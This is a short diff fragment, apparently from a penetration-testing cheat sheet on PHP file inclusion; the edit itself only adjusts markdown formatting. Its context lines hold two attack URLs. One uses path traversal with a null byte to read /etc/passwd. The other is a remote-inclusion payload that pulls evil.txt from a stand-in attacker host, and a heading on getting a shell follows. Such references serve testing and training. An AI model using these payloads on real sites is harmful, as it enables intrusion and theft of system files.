@@ -10,9 +10,7 @@ http://target.com/?page=./../../../../../../../../../etc/passwd%00
 
 # To check for RFI
 http://target.com/?page=http://hackerip/evil.txt%00
-
----
-
+```
 #### Obtaining Shell through Browser Bar (PHP)
 ```
 # If you get similar to ?page=index in the browser bar
